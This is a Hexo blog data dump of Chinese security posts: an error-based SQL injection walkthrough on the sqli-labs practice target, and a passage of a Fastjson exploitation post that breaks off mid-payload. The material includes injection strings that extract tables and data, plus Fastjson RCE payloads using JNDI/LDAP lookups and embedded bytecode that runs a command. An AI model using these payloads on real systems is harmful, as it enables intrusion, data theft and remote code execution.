</p>\n"},{"title":"极易上手的报错注入","keywords":"SQL注入,报错注入,易上手,updatexml,靶场演示","description":"极易上手的报错注入","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1579399%2F201907%2F1579399-20190717003510359-570355042.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916535&t=757f4c39d3a5884249a1291b70cde3b7","date":"2020-05-01T08:37:02.000Z","_content":"\n报错注入：报错注入的意思是用户通过执行一些语句让数据库报出了致命性错误，只需要在里面放入sql子查询语句，就可以得到对应的信息。\n\n文章开头，先学习一下中华人民共和国网络安全法：\t\nhttps://www.cto.ac.cn/thread-106.htm\n\n![upload successful](/images/pasted-20.png)\n\n![upload successful](/images/pasted-21.png)\n\n![upload successful](/images/pasted-22.png)\n\n## 漏洞简介\n在这里先简单介绍一下漏洞之王SQL注入：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：\n\n1.\t用户可以控制输入。\n2.\t用户输入的数据被当作代码拼接到了数据库语句当中。\n\n\n## 报错注入具体流程\n1.先打开靶场，靶场我选择sqli-labs的less4，这里我顺手传参了id=1\n![upload successful](/images/pasted-23.png)\n\n2.每次看到这种id=的get传参的时候，总是喜欢加个'，这次看到，这里没有效果了，页面还是正常的。\n![upload successful](/images/pasted-24.png)\n\n3.那现在怎么办呢，单引号不行，那试试双引号吧\n```\n?id=1\"\n```\n运气不错，页面报错了，这里作为黑盒测试的话，一看到报错了是最开心的，当然一般还要试试 **?id=1')** 和 **?id=1\")**\n![upload successful](/images/pasted-25.png)\n\n4.这里还是看看源码来分析吧。\n![upload successful](/images/pasted-26.png)\n这里明显看到，原来id外面先拼接了\"\"\t\n语句为：\n```\n$id = '\"' . $id . '\"';\t\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n```\n那对于我们传入的数据来说，放入到数据库里面执行的语句就是：\n```\n$sql=\"SELECT * FROM users WHERE id=(\" $id\") LIMIT 0,1\";\n```\n\n5.也就是说，在传参的时候，我们传入的数据外面有一层双引号之外，还有一层括号，那么闭合的方法就是将之间的单引号换成双引号加括号 后面再加上#注释（也可以通过--+来注释），可以看到页面返回正常，这里的传参是：\n```\n?id=1\") --+\n```\n![upload successful](/images/pasted-27.png)\n\n6.这里已经成功闭合了，那么就开始我们的报错注入吧，在\")和--+中间放入我事先准备好的数据库报错查询语句，成功查询到数据库库名security，传参为：\n```\n?id=1\") and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\n```\n![upload successful](/images/pasted-28.png)\n\n7.既然已经查询到了数据库库名，那么查到数据库里面的数据也就不远了。将报错注入的函数里面的select database()换成查询系统自带库information_schema中的表的语句。\n传参为：\n```\n?id=1\") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+\n```\n![upload successful](/images/pasted-29.png)\n\n8.查询出来一个emails表，感觉没有想要的信息，不想查询它的数据了，更改一下limit 0,1 为limit 1,1 获得另一张表referers。\n![upload successful](/images/pasted-30.png)\n\n9.有表名了，那么接下来就是查询referers表中的字段。这里学习一个新的函数，**group_concat()** ，这个函数会将group by产生的同一个分组中的值连接起来，返回一个字符串结果。什么意思呢，就是我们使用这个函数，可以不需要limit 0，1 ， limit 1，1这样轮询得到所有的数据，一个函数搞定。\n传参为：\n```\n?id=1\") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='referers' limit 0,1),0x7e),1) --+\n```\n得到了这个表中的三个字段为id,referer和ip_address\n![upload successful](/images/pasted-31.png)\n\n10.有了表名和字段名，接下来就是查询数据了，通过查询referers表中的referer字段为例，获取数据库信息。传参为: \n```\n?id=1\") and updatexml(1,concat(0x7e,(select group_concat(referer) from referers),0x7e),1) --+\n```\n\n![upload successful](/images/pasted-32.png)\n这里就获取了里面我随意插入的3个数据admin1，admin2，admin3\n\n## 总结\n\n这里就是报错注入的整个流程了，报错注入在sql注入中占比还是比较大的，还有很多bypass技巧，大家可以自行学习一下。\n\n","source":"_posts/极易上手的报错注入.md","raw":"---\ntitle: 极易上手的报错注入\ntags: \n  - SQL注入\n  - 报错注入\n  - updatexml\n  - 靶场演示\ncategories: web安全\nkeywords: 'SQL注入,报错注入,易上手,updatexml,靶场演示'\ndescription: 极易上手的报错注入\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1579399%2F201907%2F1579399-20190717003510359-570355042.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916535&t=757f4c39d3a5884249a1291b70cde3b7\ndate: 2020-05-01 16:37:02\n---\n\n报错注入：报错注入的意思是用户通过执行一些语句让数据库报出了致命性错误，只需要在里面放入sql子查询语句，就可以得到对应的信息。\n\n文章开头，先学习一下中华人民共和国网络安全法：\t\nhttps://www.cto.ac.cn/thread-106.htm\n\n![upload successful](/images/pasted-20.png)\n\n![upload successful](/images/pasted-21.png)\n\n![upload successful](/images/pasted-22.png)\n\n## 漏洞简介\n在这里先简单介绍一下漏洞之王SQL注入：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：\n\n1.\t用户可以控制输入。\n2.\t用户输入的数据被当作代码拼接到了数据库语句当中。\n\n\n## 报错注入具体流程\n1.先打开靶场，靶场我选择sqli-labs的less4，这里我顺手传参了id=1\n![upload successful](/images/pasted-23.png)\n\n2.每次看到这种id=的get传参的时候，总是喜欢加个'，这次看到，这里没有效果了，页面还是正常的。\n![upload successful](/images/pasted-24.png)\n\n3.那现在怎么办呢，单引号不行，那试试双引号吧\n```\n?id=1\"\n```\n运气不错，页面报错了，这里作为黑盒测试的话，一看到报错了是最开心的，当然一般还要试试 **?id=1')** 和 **?id=1\")**\n![upload successful](/images/pasted-25.png)\n\n4.这里还是看看源码来分析吧。\n![upload successful](/images/pasted-26.png)\n这里明显看到，原来id外面先拼接了\"\"\t\n语句为：\n```\n$id = '\"' . $id . '\"';\t\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n```\n那对于我们传入的数据来说，放入到数据库里面执行的语句就是：\n```\n$sql=\"SELECT * FROM users WHERE id=(\" $id\") LIMIT 0,1\";\n```\n\n5.也就是说，在传参的时候，我们传入的数据外面有一层双引号之外，还有一层括号，那么闭合的方法就是将之间的单引号换成双引号加括号 后面再加上#注释（也可以通过--+来注释），可以看到页面返回正常，这里的传参是：\n```\n?id=1\") --+\n```\n![upload successful](/images/pasted-27.png)\n\n6.这里已经成功闭合了，那么就开始我们的报错注入吧，在\")和--+中间放入我事先准备好的数据库报错查询语句，成功查询到数据库库名security，传参为：\n```\n?id=1\") and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\n```\n![upload successful](/images/pasted-28.png)\n\n7.既然已经查询到了数据库库名，那么查到数据库里面的数据也就不远了。将报错注入的函数里面的select database()换成查询系统自带库information_schema中的表的语句。\n传参为：\n```\n?id=1\") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+\n```\n![upload successful](/images/pasted-29.png)\n\n8.查询出来一个emails表，感觉没有想要的信息，不想查询它的数据了，更改一下limit 0,1 为limit 1,1 获得另一张表referers。\n![upload successful](/images/pasted-30.png)\n\n9.有表名了，那么接下来就是查询referers表中的字段。这里学习一个新的函数，**group_concat()** ，这个函数会将group by产生的同一个分组中的值连接起来，返回一个字符串结果。什么意思呢，就是我们使用这个函数，可以不需要limit 0，1 ， limit 1，1这样轮询得到所有的数据，一个函数搞定。\n传参为：\n```\n?id=1\") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='referers' limit 0,1),0x7e),1) --+\n```\n得到了这个表中的三个字段为id,referer和ip_address\n![upload successful](/images/pasted-31.png)\n\n10.有了表名和字段名，接下来就是查询数据了，通过查询referers表中的referer字段为例，获取数据库信息。传参为: \n```\n?id=1\") and updatexml(1,concat(0x7e,(select group_concat(referer) from referers),0x7e),1) --+\n```\n\n![upload successful](/images/pasted-32.png)\n这里就获取了里面我随意插入的3个数据admin1，admin2，admin3\n\n## 总结\n\n这里就是报错注入的整个流程了，报错注入在sql注入中占比还是比较大的，还有很多bypass技巧，大家可以自行学习一下。\n\n","slug":"极易上手的报错注入","published":1,"updated":"2021-08-07T16:10:26.680Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfl0018vkq30fwz5qq6","content":"<p>报错注入：报错注入的意思是用户通过执行一些语句让数据库报出了致命性错误，只需要在里面放入sql子查询语句，就可以得到对应的信息。</p>\n<p>文章开头，先学习一下中华人民共和国网络安全法：<br><a href=\"https://www.cto.ac.cn/thread-106.htm\">https://www.cto.ac.cn/thread-106.htm</a></p>\n<p><img src=\"/images/pasted-20.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-21.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-22.png\" alt=\"upload successful\"></p>\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>在这里先简单介绍一下漏洞之王SQL注入：<br>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：</p>\n<ol>\n<li>   用户可以控制输入。</li>\n<li>   用户输入的数据被当作代码拼接到了数据库语句当中。</li>\n</ol>\n<h2 id=\"报错注入具体流程\"><a href=\"#报错注入具体流程\" class=\"headerlink\" title=\"报错注入具体流程\"></a>报错注入具体流程</h2><p>1.先打开靶场，靶场我选择sqli-labs的less4，这里我顺手传参了id=1<br><img src=\"/images/pasted-23.png\" alt=\"upload successful\"></p>\n<p>2.每次看到这种id=的get传参的时候，总是喜欢加个’，这次看到，这里没有效果了，页面还是正常的。<br><img src=\"/images/pasted-24.png\" alt=\"upload successful\"></p>\n<p>3.那现在怎么办呢，单引号不行，那试试双引号吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;</span><br></pre></td></tr></table></figure>\n<p>运气不错，页面报错了，这里作为黑盒测试的话，一看到报错了是最开心的，当然一般还要试试 <strong>?id=1’)</strong> 和 <strong>?id=1”)</strong><br><img src=\"/images/pasted-25.png\" alt=\"upload successful\"></p>\n<p>4.这里还是看看源码来分析吧。<br><img src=\"/images/pasted-26.png\" alt=\"upload successful\"><br>这里明显看到，原来id外面先拼接了””<br>语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;\t</span><br><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>\n<p>那对于我们传入的数据来说，放入到数据库里面执行的语句就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=(&quot; $id&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>5.也就是说，在传参的时候，我们传入的数据外面有一层双引号之外，还有一层括号，那么闭合的方法就是将之间的单引号换成双引号加括号 后面再加上#注释（也可以通过–+来注释），可以看到页面返回正常，这里的传参是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-27.png\" alt=\"upload successful\"></p>\n<p>6.这里已经成功闭合了，那么就开始我们的报错注入吧，在”)和–+中间放入我事先准备好的数据库报错查询语句，成功查询到数据库库名security，传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-28.png\" alt=\"upload successful\"></p>\n<p>7.既然已经查询到了数据库库名，那么查到数据库里面的数据也就不远了。将报错注入的函数里面的select database()换成查询系统自带库information_schema中的表的语句。<br>传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-29.png\" alt=\"upload successful\"></p>\n<p>8.查询出来一个emails表，感觉没有想要的信息，不想查询它的数据了，更改一下limit 0,1 为limit 1,1 获得另一张表referers。<br><img src=\"/images/pasted-30.png\" alt=\"upload successful\"></p>\n<p>9.有表名了，那么接下来就是查询referers表中的字段。这里学习一个新的函数，<strong>group_concat()</strong> ，这个函数会将group by产生的同一个分组中的值连接起来，返回一个字符串结果。什么意思呢，就是我们使用这个函数，可以不需要limit 0，1 ， limit 1，1这样轮询得到所有的数据，一个函数搞定。<br>传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;referers&#x27; limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n<p>得到了这个表中的三个字段为id,referer和ip_address<br><img src=\"/images/pasted-31.png\" alt=\"upload successful\"></p>\n<p>10.有了表名和字段名，接下来就是查询数据了，通过查询referers表中的referer字段为例，获取数据库信息。传参为: </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(referer) from referers),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-32.png\" alt=\"upload successful\"><br>这里就获取了里面我随意插入的3个数据admin1，admin2，admin3</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这里就是报错注入的整个流程了，报错注入在sql注入中占比还是比较大的，还有很多bypass技巧，大家可以自行学习一下。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>报错注入：报错注入的意思是用户通过执行一些语句让数据库报出了致命性错误，只需要在里面放入sql子查询语句，就可以得到对应的信息。</p>\n<p>文章开头，先学习一下中华人民共和国网络安全法：<br><a href=\"https://www.cto.ac.cn/thread-106.htm\">https://www.cto.ac.cn/thread-106.htm</a></p>\n<p><img src=\"/images/pasted-20.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-21.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-22.png\" alt=\"upload successful\"></p>\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>在这里先简单介绍一下漏洞之王SQL注入：<br>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：</p>\n<ol>\n<li>   用户可以控制输入。</li>\n<li>   用户输入的数据被当作代码拼接到了数据库语句当中。</li>\n</ol>\n<h2 id=\"报错注入具体流程\"><a href=\"#报错注入具体流程\" class=\"headerlink\" title=\"报错注入具体流程\"></a>报错注入具体流程</h2><p>1.先打开靶场，靶场我选择sqli-labs的less4，这里我顺手传参了id=1<br><img src=\"/images/pasted-23.png\" alt=\"upload successful\"></p>\n<p>2.每次看到这种id=的get传参的时候，总是喜欢加个’，这次看到，这里没有效果了，页面还是正常的。<br><img src=\"/images/pasted-24.png\" alt=\"upload successful\"></p>\n<p>3.那现在怎么办呢，单引号不行，那试试双引号吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;</span><br></pre></td></tr></table></figure>\n<p>运气不错，页面报错了，这里作为黑盒测试的话，一看到报错了是最开心的，当然一般还要试试 <strong>?id=1’)</strong> 和 <strong>?id=1”)</strong><br><img src=\"/images/pasted-25.png\" alt=\"upload successful\"></p>\n<p>4.这里还是看看源码来分析吧。<br><img src=\"/images/pasted-26.png\" alt=\"upload successful\"><br>这里明显看到，原来id外面先拼接了””<br>语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;\t</span><br><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>\n<p>那对于我们传入的数据来说，放入到数据库里面执行的语句就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=(&quot; $id&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>5.也就是说，在传参的时候，我们传入的数据外面有一层双引号之外，还有一层括号，那么闭合的方法就是将之间的单引号换成双引号加括号 后面再加上#注释（也可以通过–+来注释），可以看到页面返回正常，这里的传参是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-27.png\" alt=\"upload successful\"></p>\n<p>6.这里已经成功闭合了，那么就开始我们的报错注入吧，在”)和–+中间放入我事先准备好的数据库报错查询语句，成功查询到数据库库名security，传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-28.png\" alt=\"upload successful\"></p>\n<p>7.既然已经查询到了数据库库名，那么查到数据库里面的数据也就不远了。将报错注入的函数里面的select database()换成查询系统自带库information_schema中的表的语句。<br>传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pasted-29.png\" alt=\"upload successful\"></p>\n<p>8.查询出来一个emails表，感觉没有想要的信息，不想查询它的数据了，更改一下limit 0,1 为limit 1,1 获得另一张表referers。<br><img src=\"/images/pasted-30.png\" alt=\"upload successful\"></p>\n<p>9.有表名了，那么接下来就是查询referers表中的字段。这里学习一个新的函数，<strong>group_concat()</strong> ，这个函数会将group by产生的同一个分组中的值连接起来，返回一个字符串结果。什么意思呢，就是我们使用这个函数，可以不需要limit 0，1 ， limit 1，1这样轮询得到所有的数据，一个函数搞定。<br>传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;referers&#x27; limit 0,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n<p>得到了这个表中的三个字段为id,referer和ip_address<br><img src=\"/images/pasted-31.png\" alt=\"upload successful\"></p>\n<p>10.有了表名和字段名，接下来就是查询数据了，通过查询referers表中的referer字段为例，获取数据库信息。传参为: </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(referer) from referers),0x7e),1) --+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-32.png\" alt=\"upload successful\"><br>这里就获取了里面我随意插入的3个数据admin1，admin2，admin3</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这里就是报错注入的整个流程了，报错注入在sql注入中占比还是比较大的，还有很多bypass技巧，大家可以自行学习一下。</p>\n"},{"title":"漏洞复现-Fastjson全方位利用","keywords":"漏洞复现,Fastjson,反序列化,反弹shell,命令执行","description":"漏洞复现-Fastjson全方位利用","cover":"https://img1.baidu.com/it/u=4236482212,3196079296&fm=26&fmt=auto&gp=0.jpg","date":"2021-06-08T02:45:41.000Z","_content":"\n\n\nFastJson为什么经常爆出安全漏洞？\n罪魁祸首就是autoType特性, 这就是潘多拉魔盒, 永远都会存在未知安全漏洞。\n如果说要选择一个具有代表特征的JAVA漏洞，那么我觉得是fastjson，下面介绍fastjson的两个经典漏洞复现，希望让大家对于fastjson的漏洞利用有所了解。\n\n# 概念\nfastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。\t\nFastJson特点如下：\n>（1）能够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。\t\n（2）顾名思义，FastJson操作JSON的速度是非常快的。\t\n（3）无其他包的依赖。\t\n（4）使用比较方便。\t\n\n# Fastjson指纹特征及判别方法\n## 根据返回包判断\n任意抓个包，提交方式改为POST，花括号不闭合。返回包在会出现fastjson字样。\n\n## Dnslog盲打\n```\n{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog网址\"}}\n{\"rand2\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog网址\"}}\n{\"rand3\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog网址\"}}\n{\"rand4\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog网址\"}}}\n{\"rand5\":{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}}\n```\n```\n一些畸形payload，不过依然可以触发dnslog：\n{\"rand6\":{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog网址\"}}\"\"}}\n{\"rand7\":Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}]}\n{\"rand8\":Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}\n{\"rand9\":{\"@type\":\"java.net.URL\",\"val\":\"dnslog网址\"}:0\n```\n# Fastjson历史漏洞\n## ver<=1.2.24\n1.2.24及之前没有任何防御，并且autotype默认开启。\n## ver>=1.2.25&ver<=1.2.41\n从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。\n## ver=1.2.42\n在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。黑名单改成了十进制，检测也进行了相应hash运算。\n## ver=1.2.43\n在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，\\[也被特殊处理了，又再次绕过了checkAutoType。\n## ver=1.2.44\n修复了1.2.43的绕过，处理了\\[。删除了之前的L开头、;结尾、LL开头的判断，改成了\\[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了。\n## ver>=1.2.45&ver<1.2.46\n这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。\n## ver=1.2.47\n这个版本发生了不开启autotype情况下能利用成功的绕过。\n解析一下这次的绕过：\n\n利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过\t\n这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中\t\n如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回\t\n## ver>=1.2.48&ver<=1.2.68\n在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false。在1.2.48到最新版本1.2.68之间，都是增加黑名单类\n## ver=1.2.68\n1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。\n\n# 一些RCE Payload\n```\npayload1:\n{\n  \"rand1\": {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://localhost:1389/Object\",\n    \"autoCommit\": true\n  }\n}\n```\n```\npayload2:\n{\n  \"rand1\": {\n    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n    \"_bytecodes\": [\n      \"yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"\n    ],\n    \"_name\": \"aaa\",\n    \"_tfactory\": {},\n    \"_outputProperties\": {}\n  }\n}\n```\n```\npayload3:\n{\n  \"rand1\": {\n    \"@type\": \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n    \"properties\": {\n      \"data_source\": \"ldap://localhost:1389/Object\"\n    }\n  }\n}\n```\n```\npayload4:\n{\n  \"rand1\": {\n    \"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\n    \"targetBeanName\": \"ldap://localhost:1389/Object\",\n    \"propertyPath\": \"foo\",\n    \"beanFactory\": {\n      \"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\n      \"shareableResources\": [\n        